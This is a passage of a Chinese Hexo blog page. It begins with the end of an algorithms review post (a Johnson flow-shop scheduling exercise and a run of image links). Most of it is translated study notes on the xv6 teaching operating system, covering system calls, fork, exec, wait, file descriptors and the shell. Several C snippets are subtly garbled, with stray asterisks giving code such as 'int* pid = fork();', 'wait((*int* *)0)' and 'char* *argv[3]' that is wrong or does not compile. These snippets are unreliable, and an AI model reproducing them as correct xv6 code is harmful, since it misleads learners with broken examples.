<li>N1 中作业接 N2 中作业得到最优调度</li>
</ul>
</li>
<li><p>M1 上处理 (a1, a2, a3, a4, a5, a6, a7) &#x3D; (2,5, 7, 10, 5, 3, 8)，M2 上处理 (b1, b2, b3, b4, b5, b6, b7) &#x3D; (3, 8, 2, 11, 5, 4, 4)，按照流水线作业调度问题的 Johnson 算法步骤，给出该问题的最优调度方案。</p>
</li>
</ul>
<style>.hyyimkciqjln{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/6745c41e9c2a473a9d4494af314b9cb9.jpg" class="hyyimkciqjln" alt="img">

<style>.frfkrevqgmdv{zoom:33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/ca27278ce499a04ae4b0a13ab8f0ecb6.jpg" class="frfkrevqgmdv" alt="img">

<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><style>.hrtsmqnnxpli{zoom: 50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512211853820.png" class="hrtsmqnnxpli" alt="image-20240512211853820"><style>.yjtnkgfspwmf{zoom: 50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512211954178.png" class="yjtnkgfspwmf" alt="image-20240512211954178">

<style>.wysrrdvbgjsn{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512212119179.png" class="wysrrdvbgjsn" alt="image-20240512212119179"><style>.hbbjlrlwjipc{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512212033993.png" class="hbbjlrlwjipc" alt="image-20240512212033993">

<style>.iqrlmxxmqfxt{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512212200992.png" class="iqrlmxxmqfxt" alt="image-20240512212200992"><style>.pizgxagqsjsz{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512212244626.png" class="pizgxagqsjsz" alt="image-20240512212244626">

<style>.hsgyswnwvsmd{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512212449328.png" class="hsgyswnwvsmd" alt="image-20240512212449328"><style>.plorxqcgatig{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512212506627.png" class="plorxqcgatig" alt="image-20240512212506627">

<style>.spristzybtov{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512212600843.png" class="spristzybtov" alt="image-20240512212600843"><style>.qrmcygseceal{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512212625852.png" class="qrmcygseceal" alt="image-20240512212625852">



<style>.lttwnzbvwwjf{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512212821060.png" class="lttwnzbvwwjf" alt="image-20240512212821060"><style>.qxhwjuufckit{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512212840553.png" class="qxhwjuufckit" alt="image-20240512212840553">

<style>.kkiojxcdpngl{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512213147783.png" class="kkiojxcdpngl" alt="image-20240512213147783"><style>.ifjwmvzingbs{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512213239005.png" class="ifjwmvzingbs" alt="image-20240512213239005">

<style>.kbisrnxvnthm{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512194033369.png" class="kbisrnxvnthm" alt="image-20240512194033369"><style>.eksifzgmeuah{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512213806651.png" class="eksifzgmeuah" alt="image-20240512213806651">

<style>.shcngbtuprgp{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512213620162.png" class="shcngbtuprgp" alt="image-20240512213620162"><style>.zjzyewdzsgws{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512213634721.png" class="zjzyewdzsgws" alt="image-20240512213634721">

<style>.smlkbjtaouph{zoom:50%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512213838992.png" class="smlkbjtaouph" alt="image-20240512213838992"><style>.wlunqkjpfsle{zoom: 33%;}</style><img src="/2024/05/11/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E5%A4%8D%E4%B9%A0/image-20240512214132757.png" class="wlunqkjpfsle" alt="image-20240512214132757">

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yiweiboi.github.io/2024/05/08/xv6-book-for-reading/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yiweiBoi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/08/xv6-book-for-reading/" class="post-title-link" itemprop="url">xv6 book for reading</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-05-08 22:31:39" itemprop="dateCreated datePublished" datetime="2024-05-08T22:31:39+08:00">2024-05-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-05-10 23:21:02" itemprop="dateModified" datetime="2024-05-10T23:21:02+08:00">2024-05-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>原文：<a target="_blank" rel="noopener" href="https://pdos.csail.mit.edu/6.828/2021/xv6/book-riscv-rev2.pdf">xv6: a simple, Unix-like teaching operating system (mit.edu)</a></p>
</blockquote>
<h1 id="Operating-system-interfaces-操作系统接口"><a href="#Operating-system-interfaces-操作系统接口" class="headerlink" title="Operating system interfaces 操作系统接口"></a>Operating system interfaces 操作系统接口</h1><ul>
<li><p>操作系统的工作是将计算机的资源在多个程序间共享，并且给程序提供一系列比硬件本身支持的更有用的服务。</p>
<ul>
<li>操作系统管理并抽象底层硬件，因此，举例来说，一个文字处理程序不需要去关心自己使用的是何种硬盘。</li>
<li>操作系统还对硬件进行多路复用，使多个程序可以同时运行的 (或者看起来是同时运行)。</li>
<li>最后，操作系统为程序提供了一种可控的交互方式，使得多个程序可以共享数据，共同工作。</li>
</ul>
</li>
<li><p>操作系统通过接口向用户程序提供服务。设计一个好的接口实际上是很困难的。</p>
<ul>
<li>一方面，我们希望接口简单和精准，这样它就容易正确地实现；</li>
<li>另一方面，我们可能又想为应用提供许多更加复杂的功能。解决这种矛盾的诀窍是让接口的设计依赖于一些 <em>机制</em> (*mechanism)*，并通过这些机制的组合来提供通用性。</li>
</ul>
</li>
<li><p>本书以一个操作系统为例，来说明操作系统的概念。</p>
<ul>
<li>这个操作系统就是xv6，它提供了在 Ken Thompson 和 Dennis Ritchie 的 Unix操作系统 [14] 中引入的基本接口，同时也模仿了Unix的内部设计。</li>
<li>Unix提供了一个机制组合得非常良好的窄接口，具有惊人的通用性。这样的接口设计非常成功，这也使得BSD，Linux，Mac OS X，Solaris 这样的现代操作系统，甚至 Windows 都有类似 Unix 的接口。</li>
<li>理解xv6是理解这些操作系统的一个良好起点。</li>
</ul>
</li>
<li><p>如图1.1所示，xv6 使用了传统形式的 <strong>内核</strong> —— 一个向其他运行中的程序提供服务的特殊程序。</p>
<ul>
<li>每一个正在运行的程序（称为<strong>进程</strong>），都拥有自己的包含指令、数据、栈的内存空间。</li>
<li>指令实现程序的运算，数据是用于运算过程的变量，栈则管理程序的过程调用。</li>
<li>一台计算机通常有许多进程，但只有一个内核。</li>
</ul>
</li>
</ul>
<img src="/2024/05/08/xv6-book-for-reading/Figure-1.1.png" class="" title="Figure-1.1">

<ul>
<li><p>当一个进程需要调用一个内核服务时，它就会调用 <strong>系统调用</strong>，这是操作系统接口中的一个调用。</p>
<ul>
<li>系统调用会进入内核，让内核执行服务然后返回。所以进程会在用户空间和内核空间之间交替运行。</li>
</ul>
</li>
<li><p>内核使用 CPU <a href="#ftn1">[1]</a> 提供的硬件保护机制来确保在用户空间中执行的每个进程只能访问自己的内存。</p>
<ul>
<li>内核运行时拥有硬件特权，可以访问这些受到保护的资源，而用户程序运行时则没有这些特权。</li>
<li>当用户程序调用系统调用时，硬件提高特权级别并开始执行内核中预定义的函数。</li>
</ul>
</li>
<li><p>内核提供的系统调用集合就是用户程序可见的接口。</p>
<ul>
<li>xv6 内核提供了传统 Unix 内核所提供的服务和系统调用的一个子集。</li>
<li>图1.2 列出了 xv6 的所有系统调用。</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>系统调用</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>int fork()</strong></td>
<td>创建一个进程，返回子进程的PID。</td>
</tr>
<tr>
<td><strong>int exit(int status)</strong></td>
<td>终止当前进程，并将status传递给wait()。不会返回。</td>
</tr>
<tr>
<td><strong>int wait(int *status)</strong></td>
<td>等待子进程结束，并将status接收到参数*status中，返回其PID。</td>
</tr>
<tr>
<td><strong>int kill(int pid)</strong></td>
<td>终止给定PID的进程，成功返回0，失败返回-1。</td>
</tr>
<tr>
<td><strong>int getpid()</strong></td>
<td>返回当前进程的PID。</td>
</tr>
<tr>
<td><strong>int sleep(int n)</strong></td>
<td>睡眠n个时钟周期。</td>
</tr>
<tr>
<td><strong>int exec(char *file, char *argv[])</strong></td>
<td>通过给定参数加载并执行一个文件；只在错误时返回。</td>
</tr>
<tr>
<td><strong>char *sbrk(int n)</strong></td>
<td>使进程内存增加n字节，返回新内存的起始地址。</td>
</tr>
<tr>
<td><strong>int open(char *file, int flags)</strong></td>
<td>打开一个文件，flags表示读或写，返回fd（文件描述符）。</td>
</tr>
<tr>
<td><strong>int write(int fd, char *buf, int n)</strong></td>
<td>将buf中n字节写入到文件描述符中；返回n。</td>
</tr>
<tr>
<td><strong>int read(int fd, char *buf, int n)</strong></td>
<td>从文件描述符中读取n字节到buf；返回读取字节数，文件结束返回0。</td>
</tr>
<tr>
<td><strong>int close(int fd)</strong></td>
<td>释放文件描述符fd。</td>
</tr>
<tr>
<td><strong>int dup(int fd)</strong></td>
<td>返回一个新文件描述符，其引用与fd相同的文件。</td>
</tr>
<tr>
<td><strong>int pipe(int p[])</strong></td>
<td>创建管道，将读&#x2F;写文件描述符放置在p[0]和p[1]。</td>
</tr>
<tr>
<td><strong>int chdir(char *dir)</strong></td>
<td>改变当前目录。</td>
</tr>
<tr>
<td><strong>int mkdir(char *dir)</strong></td>
<td>创建新目录。</td>
</tr>
<tr>
<td><strong>int mknod(char *file, int, int)</strong></td>
<td>创建新设备文件。</td>
</tr>
<tr>
<td><strong>int fstat(int fd, struct stat *st)</strong></td>
<td>将打开的文件的信息放置在*st中。</td>
</tr>
<tr>
<td><strong>int stat(char *file, struct stat *st)</strong></td>
<td>将命名文件信息放置在*st中。</td>
</tr>
<tr>
<td><strong>int link(char *file1, char * file2)</strong></td>
<td>为文件file1创建一个新的名称(file2)。</td>
</tr>
<tr>
<td><strong>int unlink(char *file)</strong></td>
<td>移除一个文件。</td>
</tr>
</tbody></table>
<p>​										图1.2  xv6 系统调用. 如果没有特别说明, 这些调用成功时返回 0，失败时返回 -1</p>
<ul>
<li><p>本章剩下的部分概述了 xv6 的服务的概貌 —— 进程、内存、文件描述符、管道和文件系统，并通过代码片段对其进行了说明，然后讨论了 <strong>shell</strong>（Unix 的命令行用户接口）中是如何使用它们的。</p>
<ul>
<li>这些系统调用在shell中的应用说明了系统调用的设计如何精巧。</li>
</ul>
</li>
<li><p>shell 是一个普通的程序，它从用户读取命令并执行它们。</p>
<ul>
<li>shell是一个用户程序，而不是内核的一部分，这一事实说明了系统调用接口的强大：shell没有什么特别之处。</li>
<li>这也意味着 shell 是很容易被替换的；因此，事实上现代 Unix 系统中有各种各样的 shell，每个都有自己的用户界面和脚本特性。</li>
<li>xv6 shell 是 Unix Bourne shell 的一个简单实现。它的实现可以在（<code>user/sh.c:1</code>）找到。</li>
</ul>
</li>
</ul>
<h2 id="Processes-and-memory-进程和内存"><a href="#Processes-and-memory-进程和内存" class="headerlink" title="Processes and memory 进程和内存"></a>Processes and memory 进程和内存</h2><ul>
<li><p>一个 xv6 进程由用户空间内存（指令、数据和堆栈）和内核私有的进程状态组成。</p>
<ul>
<li>xv6 对进程提供 <strong>分时</strong> 特性：它透明地切换当前 CPU 正在执行的进程。当一个进程暂时不使用 CPU 时，xv6 会保存它的 CPU 寄存器，在下次运行该进程时恢复它们。</li>
<li>内核为每个进程关联一个 <strong>PID</strong> (进程标识符)。</li>
</ul>
</li>
<li><p>可以使用 <strong>fork</strong> 系统调用创建一个新的进程。</p>
<ul>
<li><strong>fork</strong> 创建的新进程被称为 <strong>子进程</strong>，其内存内容与调用的进程完全相同，原进程被称为 <strong>父进程</strong>。</li>
<li>在父进程和子进程中，fork 都会返回。在父进程中，fork 返回子进程的 PID；在子进程中，fork返回 0。</li>
<li>例如，考虑以下用 C 编程语言编写的程序片段 [6]。</li>
</ul>
</li>
</ul>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;parent: child=%d\n&quot;</span>, pid);</span><br><span class="line">	pid = wait((*<span class="type">int</span>* *)<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;child %d is done\n&quot;</span>, pid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;child: exiting\n&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>exit</strong> 系统调用会使得调用它的进程退出，并释放资源，例如内存和打开的文件。</p>
<ul>
<li><strong>exit</strong> 需要一个整数状态参数，通常 0 表示成功，1 表示失败。</li>
</ul>
</li>
<li><p><strong>wait</strong> 系统调用返回当前进程的一个已退出（或被杀死）的子进程的 PID，并将该子进程的退出状态码复制到一个地址，该地址由 wait 参数提供；</p>
<ul>
<li>如果调用者的子进程都没有退出，则 <strong>wait</strong>等待一个子进程退出。如果调用者没有子进程，wait立即返回-1。</li>
<li>如果父进程不关心子进程的退出状态，可以传递一个 0 地址给 wait。</li>
</ul>
</li>
<li><p>在上面的例子中，输出为：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parent: child=1234</span><br><span class="line">child: exiting</span><br></pre></td></tr></table></figure>

<ul>
<li>可能会以任何一种顺序输出，这取决于是父进程还是子进程先执行它的 <strong>printf</strong> 调用。在子程序退出后，父进程的 <strong>wait</strong> 返回，父进程打印：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">child 1234 is done</span><br></pre></td></tr></table></figure>

<ul>
<li><p>虽然子进程最初与父进程拥有相同的内存内容，但父进程和子进程是在不同的内存和不同的寄存器中执行的：改变其中一个进程中的变量不会影响另一个进程。</p>
<ul>
<li>例如，当 <strong>wait</strong> 的返回值存储到父进程的 <strong>pid</strong> 变量中时，并不会改变子进程中的变量 <strong>pid</strong>。子进程中的 <strong>pid</strong> 值仍然为零。</li>
</ul>
</li>
<li><p><strong>exec</strong> 系统调用使用新内存映像来替换进程的内存， 新内存映像从文件系统中的文件中进行读取。</p>
<ul>
<li>这个文件必须有特定的格式，它指定了文件中哪部分存放指令，哪部分是数据，在哪条指令开始，等等。</li>
<li>xv6 使用 ELF 格式，第 3 章将详细讨论。</li>
<li>当 <strong>exec</strong> 成功时，它并不返回到调用程序；相反，从文件中加载的指令在 ELF 头声明的入口点开始执行。</li>
<li><strong>exec</strong> 需要两个参数：包含可执行文件的文件名和一个字符串参数数组。例如：</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* *argv[<span class="number">3</span>];</span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">&quot;echo&quot;</span>;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">argv[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">exec(<span class="string">&quot;/bin/echo&quot;</span>, argv);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;exec error\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>上述代码会执行 &#x2F;bin&#x2F;echo 程序，并将 argv 数组作为参数。大多数程序都会忽略参数数组的第一个元素，也就是程序名称。</p>
</li>
<li><p>xv6 shell 使用上述调用来在用户空间运行程序。</p>
<ul>
<li>shell 的主结构很简单，参见 <strong>main</strong> (user&#x2F;sh.c:145)。主循环用 <strong>getcmd</strong> 读取用户的一行输入，然后调用 <strong>fork</strong>，创建 shell 副本。</li>
<li>父进程调用 wait，而子进程则运行命令。</li>
<li>例如，如果用户向 shell输入了 <strong>echo hello</strong>，那么就会调用 <strong>runcmd</strong>，参数为 <strong>echo hello</strong>。<strong>runcmd</strong> (user&#x2F;sh.c:58) 运行实际的命令。</li>
<li>对于 <strong>echo hello</strong>，它会调用 <strong>exec</strong> (user&#x2F;sh.c:78)。如果 <strong>exec</strong> 成功，那么子进程将执行 echo 程序的指令，而不是 <strong>runcmd</strong> 的。</li>
<li>在某些时候，<strong>echo</strong> 会调用 <strong>exit</strong>，这将使父程序从 main (user&#x2F;sh.c:145)中的 <strong>wait</strong> 返回。</li>
</ul>
</li>
</ul>
<blockquote>
<p>user&#x2F;sh.c:145</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Ensure that three file descriptors are open.</span></span><br><span class="line">  <span class="keyword">while</span>((fd = open(<span class="string">&quot;console&quot;</span>, O_RDWR)) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(fd &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">      close(fd);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Read and run input commands. </span></span><br><span class="line">  <span class="keyword">while</span>(getcmd(buf, <span class="keyword">sizeof</span>(buf)) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(buf[<span class="number">0</span>] == <span class="string">&#x27;c&#x27;</span> &amp;&amp; buf[<span class="number">1</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp; buf[<span class="number">2</span>] == <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">      <span class="comment">// Chdir must be called by the parent, not the child.</span></span><br><span class="line">      buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] = <span class="number">0</span>;  <span class="comment">// chop \n</span></span><br><span class="line">      <span class="keyword">if</span>(chdir(buf+<span class="number">3</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;cannot cd %s\n&quot;</span>, buf+<span class="number">3</span>);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(fork1() == <span class="number">0</span>)</span><br><span class="line">      runcmd(parsecmd(buf));</span><br><span class="line">    wait(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><p>你可能会奇怪为什么 <strong>fork</strong> 和 <strong>exec</strong> 没有结合在一次调用中，我们后面会看到 shell 在实现 I&#x2F;O 重定向时利用了这种分离的特性。</p>
<ul>
<li>为了避免创建相同进程并立即替换它（使用exec）所带来的浪费，内核通过使用虚拟内存技术（如copy-on-write）来优化这种用例的 fork 实现（见 4.6 节）。</li>
</ul>
</li>
<li><p>xv6 隐式分配大部分用户空间内存：<strong>fork</strong> 复制父进程的内存到子进程，<strong>exec</strong> 分配足够的内存来容纳可执行文件。</p>
<ul>
<li>一个进程如果在运行时需要更多的内存（可能是为了 <strong>malloc</strong>），可以调用 sbrk(n) 将其数据内存增长 n 个字节；sbrk 返回新内存的位置。</li>
</ul>
</li>
</ul>
<h2 id="I-O-and-File-descriptors-I-O-和文件描述符"><a href="#I-O-and-File-descriptors-I-O-和文件描述符" class="headerlink" title="I&#x2F;O and File descriptors I&#x2F;O 和文件描述符"></a>I&#x2F;O and File descriptors I&#x2F;O 和文件描述符</h2><ul>
<li><p><strong>文件描述符</strong> 是一个小整数，代表一个可由进程读取或写入的内核管理对象。</p>
<ul>
<li>一个进程可以通过打开一个文件、目录、设备，或者通过创建一个管道，或者通过复制一个现有的描述符来获得一个文件描述符。</li>
<li>为了简单起见，我们通常将文件描述符所指向的对象称为文件；</li>
<li>文件描述符接口将文件、管道和设备之间的差异抽象化，使它们看起来都像字节流。我们把输入和输出称为 <strong>I&#x2F;O</strong>。</li>
</ul>
</li>
<li><p>在内部，xv6 内核为每一个进程单独维护一个以文件描述符为索引的表，因此每个进程都有一个从 0 开始的文件描述符私有空间。</p>
<ul>
<li>按照约定，一个进程从文件描述符 0 (标准输入) 读取数据，向文件描述符 1 (标准输出) 写入输出，向文件描述符 2 (标准错误) 写入错误信息。</li>
<li>正如我们将看到的那样，shell 利用这个约定来实现 I&#x2F;O 重定向和管道。</li>
<li>shell确保自己总是有三个文件描述符打开（user&#x2F;sh.c:151），这些文件描述符默认是控制台的文件描述符。</li>
</ul>
</li>
</ul>
<blockquote>
<p>user&#x2F;sh.c:151</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Ensure that three file descriptors are open.</span></span><br><span class="line">  <span class="keyword">while</span>((fd = open(<span class="string">&quot;console&quot;</span>, O_RDWR)) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(fd &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">      close(fd);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><p><strong>read</strong>&#x2F;<strong>write</strong> 系统调用可以从文件描述符指向的文件读写数据。</p>
<ul>
<li><p>调用 <strong>read(fd, buf, n)</strong> 从文件描述符 <strong>fd</strong> 中读取不超过 <strong>n</strong> 个字节的数据，将它们复制到 <strong>buf</strong> 中，并返回读取的字节数。</p>
</li>
<li><p>每个引用文件的文件描述符都有一个与之相关关联偏移量。<strong>read</strong> 从当前文件偏移量中读取数据，然后按读取的字节数推进偏移量，随后的 <strong>read</strong> 将返回上次读取之后的数据。当没有更多的字节可读时，读返回零，表示文件结束。</p>
</li>
<li><p><strong>write(fd, buf, n)</strong> 表示将 <strong>buf</strong> 中的 <strong>n</strong> 个字节写入文件描述符 <strong>fd</strong> 中，并返回写入的字节数。</p>
</li>
<li><p>若写入字节数小于 n 则该次写入发生错误。和 <strong>read</strong> 一样，<strong>write</strong> 在当前文件偏移量处写入数据，然后按写入的字节数将偏移量向前推进：每次 <strong>write</strong> 都从上一次写入的地方开始。</p>
</li>
</ul>
</li>
<li><p>下面的程序片段 (程序 <strong>cat</strong> 的核心代码) 将数据从其标准输入复制到其标准输出。如果出现错误，它会向标准错误写入一条消息。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">512</span>];</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">for</span> (;;)</span><br><span class="line">&#123;</span><br><span class="line">    n = read(<span class="number">0</span>, buf, <span class="keyword">sizeof</span> buf);</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (write(<span class="number">1</span>, buf, n) != n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;write error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>在这个代码片段中，需要注意的是，<strong>cat</strong> 不知道它是从文件、控制台还是管道中读取的。</p>
<ul>
<li>同样，<strong>cat</strong> 也不知道它是在打印到控制台、文件还是其他什么地方。</li>
<li>文件描述符的使用和 0 代表输入，1 代表输出的约定，使得 <strong>cat</strong> 可以很容易实现。</li>
</ul>
</li>
<li><p><strong>close</strong> 系统调用会释放一个文件描述符，使它可以被以后的 <strong>open</strong>、<strong>pipe</strong> 或 <strong>dup</strong> 系统调用所重用（见下文）。</p>
